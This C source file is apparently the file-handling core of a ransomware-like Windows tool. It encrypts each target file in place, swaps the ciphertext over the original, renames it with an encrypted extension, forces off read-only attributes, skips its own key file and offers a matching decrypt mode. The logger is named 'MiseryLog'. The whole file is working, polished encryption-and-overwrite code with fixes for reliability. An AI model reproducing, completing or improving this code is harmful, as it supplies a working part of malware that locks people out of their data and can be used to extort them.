// SPDX-License-Identifier: MIT
// fileio.c - Heavy lifting: disk reads/writes, buffer allocation, crypto calls

#include "fops_internal.h"
#include "fops_log.h"
#include "../crypto.h"
#include <string.h>

extern bool FopsIsKeyFilePath(const char *path);

void FopsProcessFileIO(FILEOPS_CTX *ctx, const char *narrowPath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    BYTE *buf = NULL, *plaintext = NULL;
    DWORD bufSize = 0, fs = 0;
    bool success = false;

    if (!ctx->config.decryptMode && FopsIsKeyFilePath(narrowPath)) {
        success = true;
        EnterCriticalSection(&ctx->statsLock); ctx->stats.filesSucceeded++; LeaveCriticalSection(&ctx->statsLock);
        goto cleanup;
    }

    // IMPROVEMENT: Added FILE_FLAG_SEQUENTIAL_SCAN for faster disk caching
    hFile = CreateFileA(narrowPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto cleanup;

    fs = GetFileSize(hFile, NULL);
    if (fs == INVALID_FILE_SIZE) { CloseHandle(hFile); goto cleanup; }
    if (fs == 0) {
        CloseHandle(hFile);
        success = true;
        EnterCriticalSection(&ctx->statsLock); ctx->stats.filesSucceeded++; LeaveCriticalSection(&ctx->statsLock);
        goto cleanup;
    }

    if (ctx->config.decryptMode) {
        bufSize = fs;
        buf = (BYTE *)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) goto cleanup;

        DWORD rd = 0;
        if (!ReadFile(hFile, buf, fs, &rd, NULL) || rd != fs) goto cleanup;
        CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;

        DWORD maxPlainCap = fs;
        plaintext = (BYTE *)VirtualAlloc(NULL, maxPlainCap, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!plaintext) goto cleanup;

        DWORD decLen = 0;
        if (DecryptBuffer(ctx->config.crypto_ctx, buf, fs, plaintext, &decLen) != CRYPTO_SUCCESS) goto cleanup;

        char origPath[FILEOPS_MAX_PATH];
        strncpy(origPath, narrowPath, sizeof(origPath) - 1); origPath[sizeof(origPath) - 1] = '\0';
        char *encPos = NULL;
        for (char *p = origPath; *p; p++) { if (*p == '.' && _strnicmp(p, ENC_EXT, ENC_EXT_LEN) == 0) encPos = p; }
        
        // FIX: Defensive check to ensure we don't mangle files like "document.encrypted.bak"
        if (!encPos || encPos[ENC_EXT_LEN] != '\0') {
            MiseryLog(MISERY_LOG_ERROR, "FileOps: Invalid suffix in decrypt path: %s", narrowPath);
            goto cleanup;
        }
        *encPos = '\0';

        char tmpPath[FILEOPS_MAX_PATH];
        size_t pathLen = strlen(origPath);
        if (pathLen > FILEOPS_MAX_PATH - 5) goto cleanup;
        memcpy(tmpPath, origPath, pathLen); memcpy(tmpPath + pathLen, ".tmp", 5);

        // IMPROVEMENT: Removed FILE_SHARE_READ on write handle for security
        HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
        if (hWrite == INVALID_HANDLE_VALUE) goto cleanup;

        DWORD wr = 0; BOOL writeOk = WriteFile(hWrite, plaintext, decLen, &wr, NULL);
        CloseHandle(hWrite);
        if (!writeOk || wr != decLen) { DeleteFileA(tmpPath); goto cleanup; }
        
        // FIX: Force remove read-only attribute to prevent atomic swap failures
        SetFileAttributesA(origPath, FILE_ATTRIBUTE_NORMAL);
        if (!MoveFileExA(tmpPath, origPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) { DeleteFileA(tmpPath); goto cleanup; }

        // FIX: Force remove read-only attribute before deleting leftover encrypted file
        SetFileAttributesA(narrowPath, FILE_ATTRIBUTE_NORMAL);
        DeleteFileA(narrowPath);
        
        success = true;
        EnterCriticalSection(&ctx->statsLock); ctx->stats.bytesProcessed += fs; ctx->stats.filesSucceeded++; LeaveCriticalSection(&ctx->statsLock);

    } else {
        bufSize = CRYPTO_REQUIRED_CAPACITY(fs);
        buf = (BYTE *)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buf) goto cleanup;

        plaintext = (BYTE *)VirtualAlloc(NULL, fs, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!plaintext) goto cleanup;

        DWORD rd = 0;
        if (!ReadFile(hFile, plaintext, fs, &rd, NULL) || rd != fs) goto cleanup;
        CloseHandle(hFile); hFile = INVALID_HANDLE_VALUE;

        DWORD encLen = 0;
        CRYPTO_ERROR cerr = EncryptBuffer(ctx->config.crypto_ctx, plaintext, rd, buf, &encLen, bufSize);
        SecureZeroMemory(plaintext, fs); VirtualFree(plaintext, 0, MEM_RELEASE); plaintext = NULL;
        if (cerr != CRYPTO_SUCCESS) goto cleanup;

        char tmpPath[FILEOPS_MAX_PATH];
        size_t pathLen = strlen(narrowPath);
        if (pathLen > FILEOPS_MAX_PATH - 5) goto cleanup;
        memcpy(tmpPath, narrowPath, pathLen); memcpy(tmpPath + pathLen, ".tmp", 5);

        HANDLE hWrite = CreateFileA(tmpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
        if (hWrite == INVALID_HANDLE_VALUE) goto cleanup;

        DWORD wr = 0; BOOL writeOk = WriteFile(hWrite, buf, encLen, &wr, NULL);
        CloseHandle(hWrite);
        if (!writeOk || wr != encLen) { DeleteFileA(tmpPath); goto cleanup; }
        
        // FIX: Bypass read-only protections for atomic swap
        SetFileAttributesA(narrowPath, FILE_ATTRIBUTE_NORMAL);
        if (!MoveFileExA(tmpPath, narrowPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) { DeleteFileA(tmpPath); goto cleanup; }

        char encPath[FILEOPS_MAX_PATH];
        size_t encPathLen = strlen(narrowPath);
        if (encPathLen > FILEOPS_MAX_PATH - ENC_EXT_LEN - 1) goto cleanup;
        memcpy(encPath, narrowPath, encPathLen); memcpy(encPath + encPathLen, ENC_EXT, ENC_EXT_LEN); encPath[encPathLen + ENC_EXT_LEN] = '\0';
        
        SetFileAttributesA(narrowPath, FILE_ATTRIBUTE_NORMAL);
        if (!MoveFileExA(narrowPath, encPath, MOVEFILE_REPLACE_EXISTING | MOVEFILE_WRITE_THROUGH)) {
            // FIX: Critical fallback. If this rename fails, the next run will double-encrypt the ciphertext, corrupting it forever.
            if (!MoveFileA(narrowPath, encPath)) {
                MiseryLog(MISERY_LOG_ERROR, "FileOps: Critical rename failed, data preserved in: %s", narrowPath);
            }
            goto cleanup;
        }

        success = true;
        EnterCriticalSection(&ctx->statsLock); ctx->stats.bytesProcessed += fs; ctx->stats.filesSucceeded++; LeaveCriticalSection(&ctx->statsLock);
    }

cleanup:
    if (!success) {
        EnterCriticalSection(&ctx->statsLock); ctx->stats.filesFailed++; ctx->stats.lastSystemError = GetLastError(); LeaveCriticalSection(&ctx->statsLock);
    }
    if (buf) { SecureZeroMemory(buf, bufSize); VirtualFree(buf, 0, MEM_RELEASE); }
    if (plaintext) { SecureZeroMemory(plaintext, fs > 0 ? fs : 4096); VirtualFree(plaintext, 0, MEM_RELEASE); }
    if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
}